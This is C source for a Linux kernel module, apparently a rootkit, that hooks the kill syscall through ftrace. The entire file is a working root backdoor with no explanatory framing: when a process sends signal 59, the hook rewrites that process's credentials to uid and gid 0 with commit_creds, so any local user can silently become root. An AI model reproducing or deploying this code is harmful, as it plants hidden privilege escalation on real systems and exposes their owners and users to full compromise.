#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("et de varginha");
MODULE_DESCRIPTION("Simples Hook na syscall kill");

static asmlinkage long(*orig_kill)(const struct pt_regs *);

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->si;

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }

        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;

        commit_creds(newcredentials);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init mangekyou_init(void){
        int error; 
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
        return 0;
}

static void __exit mangekyou_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(mangekyou_init);
module_exit(mangekyou_exit);
